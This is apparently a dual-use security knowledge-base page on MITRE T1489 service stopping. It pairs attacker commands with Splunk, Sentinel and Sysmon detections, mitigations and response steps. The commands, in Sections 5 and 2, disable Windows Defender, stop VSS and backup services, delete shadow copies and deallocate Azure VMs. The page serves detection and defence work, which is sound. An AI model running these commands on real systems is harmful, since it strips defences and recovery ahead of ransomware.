# [IMPACT-SERVICE-STOP-001]: Service Shutdown/Deletion (Multi-Env)

## 1. METADATA HEADER

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IMPACT-SERVICE-STOP-001 |
| **Technique Name** | Service Shutdown/Deletion |
| **MITRE ATT&CK v18.1** | Service Stop (T1489) & Account Access Removal (T1531) – https://attack.mitre.org/techniques/T1489/, https://attack.mitre.org/techniques/T1531/ |
| **Tactic** | Impact |
| **Platforms** | Windows Server / Windows Endpoint, Linux, Azure VMs, Hypervisors, SaaS admin portals |
| **Environment** | Multi-Env (on‑prem, Azure, M365, other SaaS) |
| **Severity** | High to Critical (depending on service criticality) |
| **CVE** | N/A (abuse of system features; often used alongside other vulnerabilities) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2012 R2–2025, Windows 10/11, major Linux distros, Azure IaaS VMs, M365/Azure services |
| **Patched In** | N/A – mitigated via hardening, RBAC, EDR, and monitoring; core stop/delete operations remain by design.[61][48][51] |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Adversaries routinely stop or disable services to maximize the impact of subsequent attacks. Typical targets include antivirus/EDR agents, backup services, database engines, domain controllers, and critical line-of-business applications. On Windows, this often involves `sc stop`, `net stop`, `taskkill`, or PowerShell `Stop-Service`, sometimes deployed via GPOs or remote execution tooling.[49][52][58][61] In cloud/SaaS contexts, attackers may disable service instances, deallocate VMs, or revoke access to critical SaaS features to deny availability.[48][50]
- **Attack Surface:** Windows Service Control Manager (SCM), systemd and init on Linux, VMware/Hyper-V management APIs, Azure `Deallocate Virtual Machine` operations, M365 service controls, and directory/group policy changes that disable or remove services.[49][52][55][50]
- **Business Impact:** **Denial of security visibility (by killing EDR/AV), loss of backup capabilities, and downtime for critical applications.** This significantly increases the success rate of ransomware and destructive attacks and prolongs recovery by disabling defenses and operational services.[49][52]
- **Technical Context:** MITRE ATT&CK distinguishes Service Stop (T1489) and Account Access Removal (T1531) as impact techniques used to prevent recovery and hinder incident response.[61][51] Modern ransomware campaigns (e.g., RansomHub, Akira) consistently stop AV/EDR, VSS, and backup services before encryption.[49][52][58] On Azure, adversaries may deallocate or delete VMs that host security tooling or business workloads, which is observable in Azure Activity Logs.[50]

### Operational Risk

- **Execution Risk:** Medium to High – Stopping services is generally reversible, but if combined with data destruction or encryption, the effective impact becomes critical. Stopping security services can have immediate negative impact on security posture.  
- **Stealth:** Medium – Individual service operations may blend with admin activity; however, large-scale, scripted service stops across many hosts or out-of-hours are strong indicators of compromise.[49][55]
- **Reversibility:** Medium – Services can usually be restarted, but if backups or snapshots are also removed (T1490/T1485) the overall impact may be long-lasting.

### Compliance Mappings

| Framework | Control / ID | Description (Failure Mode) |
|---|---|---|
| **CIS Benchmarks** | Windows CIS 18.x, Linux CIS 1.x | Lack of restrictions on who can control system services and weak logging allow attackers to stop critical services undetected. |
| **DISA STIG** | Windows, Azure Compute STIGs | Non-enforcement of service hardening, unauthorized disabling of security controls. |
| **CISA SCuBA** | Logging & Monitoring | Inadequate monitoring of critical security service status and cloud service state. |
| **NIST SP 800-53 Rev.5** | AC-6, AU-12, SI-4, CP-10 | Excessive privileges, insufficient logging, and inadequate failover procedures for critical services.[61][48] |
| **GDPR** | Art. 32 | Failure to ensure ongoing confidentiality, integrity, and availability of processing – especially if security services are disabled. |
| **DORA** | Art. 11 | Insufficient ICT resilience where attackers can disrupt core financial services by shutting down platforms. |
| **NIS2** | Art. 21 | Missing operational safeguards and monitoring around essential service availability. |
| **ISO 27001:2022** | A.5.29, A.8.16 | Poor monitoring of security controls and weak capacity management/availability for systems. |
| **ISO 27005** | Risk Scenario: "EDR/backup infrastructure disabled before destructive attack" | Hinders detection and recovery, increases loss magnitude. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (Endpoints):**
  - Windows: Local Administrator or SYSTEM to stop protected services such as AV/EDR, VSS, SQL, DC roles.[49][52]
  - Linux: `root` or sudo rights to stop systemd services or daemons.
- **Required Privileges (Cloud/Hypervisor):**
  - Azure: VM Contributor/Owner to deallocate or delete VMs; application-specific roles for PaaS services.[50]
- **Required Access:**
  - Local or remote admin channels (RDP, SSH, PsExec, WMI, WinRM, hypervisor consoles, Azure Portal/CLI).

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Windows – Service Inventory

```powershell
Get-Service | Where-Object { $_.Status -eq 'Running' } |
  Select-Object Name,DisplayName,Status | Sort-Object Name
```

**What to Look For (Attacker):**
- Security agents (Defender, EDR connectors, backup services) to target.

**What to Look For (Defender):**
- Non-standard or unknown services that could be used for persistence or impact.

### Azure – VM Deallocation Monitoring

```kusto
AzureActivity
| where OperationNameValue =~ "MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION"
| where ActivityStatusValue =~ "Succeeded"
| summarize count() by Caller, ResourceGroup, bin(TimeGenerated, 1h)
```

**What to Look For:**
- Unusual callers or off-hours VM deallocation patterns for critical workloads.[50]

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Stopping Security & Backup Services on Windows

**Supported Versions:** Windows Server 2012 R2–2025, Windows 10/11.

#### Step 1: Stop Windows Defender and EDR Services

**Objective:** Disable preventive and detection capabilities.

```cmd
sc stop WinDefend
sc config WinDefend start= disabled
```

Ransomware families such as Akira and RansomHub execute similar commands or use signed kernel drivers to kill security agents.[49][52][58]

#### Step 2: Stop Backup and Shadow Copy Services

```cmd
net stop VSS /y
net stop SQLWriter /y
```

Combined with T1490 (Inhibit System Recovery), attackers may also remove shadow copies:
```powershell
Get-WmiObject Win32_ShadowCopy | Remove-WmiObject
```

### METHOD 2 – Stopping Services via PowerShell

```powershell
$targets = 'WinDefend','VSS','SQLWriter','BackupExecVSSProvider'
foreach ($svc in $targets) {
  try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } catch {}
}
```

### METHOD 3 – Azure VM Deallocation as Service Stop

**Objective:** Use Azure control plane to deallocate or stop key VMs, denying access to hosted services.[50]

```bash
az vm deallocate -g <RG_NAME> -n <VM_NAME>
```

**Expected Impact:**
- Services hosted on the VM become unreachable; this may include SIEM collectors, domain controllers, or application servers.

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

- **Atomic Technique:** T1489 (Service Stop) – e.g., tests that use `net stop` or `sc stop` to stop Windows services.[55][60]

Example (conceptual):
```powershell
Invoke-AtomicTest T1489 -TestNumbers 1
```

Use a non-production service to verify detection rules and logging.

---

## 7. TOOLS & COMMANDS REFERENCE

- Windows `sc`, `net`, `taskkill`, `Stop-Service`.
- Linux `systemctl stop`, `service`, `killall`.
- Azure CLI `az vm deallocate`, `az vm stop`.

Defenders must baseline legitimate usage and alert on anomalies.

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Suspicious Bulk Service Stop on Windows

```spl
index=wineventlog sourcetype="WinEventLog:Security" EventCode=7036
| search Message="*stopped*service*"
| stats count by host, servicename, user, bin(_time, 10m)
| where count >= 10
```

Adjust fields depending on your Windows logging configuration; 7036 may also appear in System logs (sourcetype `WinEventLog:System`).

### Rule 2: Azure VM Deallocate Spikes

```spl
index=azure sourcetype="azure:monitor:activity"
| where operationName="Microsoft.Compute/virtualMachines/deallocate/action" AND ActivityStatus="Succeeded"
| bin _time span=15m
| stats count by _time, caller
| where count >= 5
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Multiple Critical Services Stopped on Windows Hosts

```kusto
SecurityEvent
| where EventID == 7036
| where Param1 has_any ("WinDefend","VSS","SQLWriter","BackupExecVSSProvider")
| summarize ServiceStops = count() by Computer, bin(TimeGenerated, 15m)
| where ServiceStops >= 5
```

### Query 2: Azure VM Deallocate Operations

```kusto
AzureActivity
| where OperationNameValue =~ "MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION"
| where ActivityStatusValue =~ "Succeeded"
| summarize VMDeallocations = count() by Caller, bin(TimeGenerated, 15m)
| where VMDeallocations >= 3
```

---

## 10. WINDOWS EVENT LOG MONITORING

Key events:
- **7036 – The service entered the stopped state** (System log).  
- **7040 – Start type changed** (e.g., disabled).  
- **4688 – Process creation** for `sc.exe`, `net.exe`, `taskkill.exe`, `powershell.exe` scripts stopping many services.

Ensure Advanced Audit Policy and service control logging are enabled via Group Policy.

---

## 11. SYSMON DETECTION PATTERNS

Example Sysmon config to catch suspicious service control tools:

```xml
<ProcessCreate onmatch="include">
  <Image condition="end with">\sc.exe</Image>
  <Image condition="end with">\net.exe</Image>
  <Image condition="end with">\taskkill.exe</Image>
  <CommandLine condition="contains"> stop </CommandLine>
</ProcessCreate>
```

Forward these events to Sentinel/Splunk for correlation with service stop events.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

Defender for Cloud and Defender for Endpoint can raise alerts when security agents are disabled, services are stopped, or tampering is detected on critical workloads.[52][82]

Ensure:
- Defender for Servers enabled on all VMs.  
- Tamper protection active to prevent disabling of security services.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

In M365, account access removal (T1531) can be seen in Purview/Unified Audit Logs (e.g., `Remove-Mailbox`, disabling user accounts, licensing changes).[51][54]

Example Purview query:
```powershell
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) \
  -Operations Remove-Mailbox,DisableUserAccount -ResultSize 5000
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- Lock down who can stop or disable critical services via local and domain Group Policy.  
- Enforce tamper protection for security products.  
- Apply least privilege and JIT for Azure operations such as VM deallocation.[48][50]

### Priority 2: HIGH

- Baseline normal service stop patterns (patch windows, maintenance) and alert on deviations.  
- Require change tickets for planned service shutdowns in critical environments.

---

## 15. DETECTION & INCIDENT RESPONSE

### IOCs

- Sudden termination of AV/EDR, backup, and logging services across multiple hosts.[49][52]  
- Coordinated VM deallocation or shutdown events for critical workloads.[50]

### Response

1. Immediately restart critical security and backup services (or VMs) where possible.  
2. Investigate who issued the stop/deallocate commands (process lineage, Azure caller).  
3. Look for follow-on activity: ransomware, data destruction, account lockouts.  
4. Harden service configurations and rotate compromised credentials.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | Initial Access | IA-VALID-001 / IA-PHISH-001 | Attacker obtains privileged access. |
| **2** | Privilege Escalation | PE-VALID-010 / PE-ACCTMGMT-011 | Elevate to local admin, domain admin, or high Azure roles. |
| **3** | Current Step | **[IMPACT-SERVICE-STOP-001] Service Shutdown/Deletion** | Stop or disable security, backup, and business services. |
| **4** | Impact | T1486, T1485 | Deploy ransomware or destroy data with reduced chance of detection or recovery.[61][51] |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: RansomHub Campaigns

Trend Micro documented RansomHub campaigns where attackers used scripts (`disableAV.bat`, `tdsskiller.bat`) and tools (STONESTOP, POORTRY) to kill AV/EDR processes and services, and to delete registry keys controlling security products.[49] They also removed backup-related services to inhibit recovery.

### Example 2: Akira Ransomware Targeting Backups

Akira campaigns show systematic removal of shadow copies and stopping of backup services to prevent system recovery, often via PowerShell commands that remove `Win32_Shadowcopy` instances and stop Volume Shadow Copy and related services.[52]

These real-world incidents highlight Service Stop and Account Access Removal as standard components of modern ransomware playbooks.

---